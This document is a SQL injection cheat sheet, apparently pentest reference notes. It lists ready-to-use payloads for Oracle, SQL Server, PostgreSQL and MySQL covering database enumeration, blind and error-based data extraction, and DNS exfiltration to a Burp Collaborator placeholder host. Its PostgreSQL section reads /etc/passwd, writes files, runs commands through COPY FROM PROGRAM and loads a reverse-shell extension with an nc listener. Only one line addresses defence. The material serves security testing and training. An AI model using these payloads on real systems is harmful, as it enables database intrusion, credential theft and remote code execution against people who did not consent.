# SQL Injection Cheat Sheet

## String Concatenation

| DB         | Syntax                             |
| ---------- | ---------------------------------- |
| Oracle     | 'foo'\|\|'bar'                     |
| Microsoft  | 'foo'+'bar'                        |
| PostgreSQL | `'foo'\|\|'bar'`                   |
| MySQL      | 'foo' 'bar' or CONCAT('foo','bar') |

---

## Substring

Extracts `length` characters from `string` starting at `offset` (1-based index).

| DB         | Syntax                      |
| ---------- | --------------------------- |
| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

---

## Comments

Truncates the query after the injection point.

| DB | Syntax |
|---|---|
| Oracle | `--comment` |
| Microsoft | `--comment` / `/*comment*/` |
| PostgreSQL | `--comment` / `/*comment*/` |
| MySQL | `#comment` / `-- comment` (note space) / `/*comment*/` |

---

## Database Version

| DB         | Payload                        |
| ---------- | ------------------------------ |
| Oracle     | SELECT banner FROM v$version   |
| Oracle     | SELECT version FROM v$instance |
| Microsoft  | SELECT @@version               |
| PostgreSQL | SELECT version()               |
| MySQL      | SELECT @@version               |

---

## Database Contents

**List tables:**

| DB | Payload |
|---|---|
| Oracle | `SELECT * FROM all_tables` |
| Microsoft/PostgreSQL/MySQL | `SELECT * FROM information_schema.tables` |

**List columns:**

| DB | Payload |
|---|---|
| Oracle | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft/PostgreSQL/MySQL | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

---

## Conditional Errors

Triggers a DB error if the boolean condition is true — useful for blind inference.

| DB | Payload |
|---|---|
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

---

## Error-Based Data Extraction

Leaks data through verbose error messages.

| DB | Payload | Error output |
|---|---|---|
| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT 'secret')` | `Conversion failed when converting the varchar value 'secret' to data type int.` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` | `invalid input syntax for integer: "secret"` |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` | `XPATH syntax error: '\secret'` |

---

## Stacked Queries

Executes a second query. Results aren't returned — primarily used for blind SQLi (time delays, DNS lookups).

> Oracle does not support stacked queries.

| DB | Syntax |
|---|---|
| Microsoft | `QUERY-1; QUERY-2` |
| PostgreSQL | `QUERY-1; QUERY-2` |
| MySQL | `QUERY-1; QUERY-2` (limited support — depends on PHP/Python API) |

---

## Time Delays

Unconditional 10-second delay.

| DB         | Payload                               |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | SELECT SLEEP(10)                      |

---

## Conditional Time Delays

Delays only if the boolean condition is true.

| DB         | Payload                                                                                                          |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |

---

## DNS Lookup

Triggers an out-of-band DNS request to a Burp Collaborator subdomain.

| DB | Payload |
|---|---|
| Oracle (unpatched) | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| Oracle (patched, elevated privs) | `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| Microsoft | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL (Windows only) | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` |

---

## DNS Lookup with Data Exfiltration

Exfiltrates query results via DNS subdomain — retrieve from Collaborator.

| DB | Payload |
|---|---|
| Oracle | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| Microsoft | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` |
| PostgreSQL | `create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '\|\|p\|\|'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();` |
| MySQL (Windows only) | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

## Interacting with PostgreSQL

## Regex Patterns for Finding SQLi Vulnerabilities

```regex
SELECT|UPDATE|DELETE|INSERT|CREATE|ALTER|DROP (WHERE|VALUES).*?' (WHERE|VALUES).*" + .*sql.*" jdbcTemplate
```

## Common Character Bypasses

- Use `/**/` instead of `space`.
- Use `$$string$$` instead of `'string'`.

## Error-Based SQL Injection

```sql
' and 0=CAST((SELECT VERSION()) AS INT)--
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--
';SELECT CAST(CAST(QUERY_TO_XML('SELECT ...',TRUE,TRUE,'') AS TEXT) AS INT)--
```

## Reading and Writing Files

#### Reading with COPY

```sql
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd'; 
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
SELECT * FROM tmp;
DROP TABLE tmp;
```

#### Reading with Large Objects

```sql
SELECT lo_import('/etc/passwd');
SELECT lo_get(16513);
SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
```

```bash
echo 726f6f743<SNIP> | xxd -r -p
```

#### Writing with COPY

```sql
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;
```

#### Writing with Large Objects

```bash
split -b 2048 /etc/passwd xaa
xxd -ps -c 99999999999 xaa
```

```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
SELECT lo_export(31337, '/tmp/passwd');
SELECT lo_unlink(31337);
```

## Command Execution

#### RCE with COPY

```sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
DROP TABLE tmp;
```

#### RCE with Extensions

```bash
sudo apt install postgresql-server-dev-13 gcc
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
nc -nvlp 443
```

```sql
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('127.0.0.1', 443);
```

## Defending Against SQL Injection

Use `parameterized queries`!
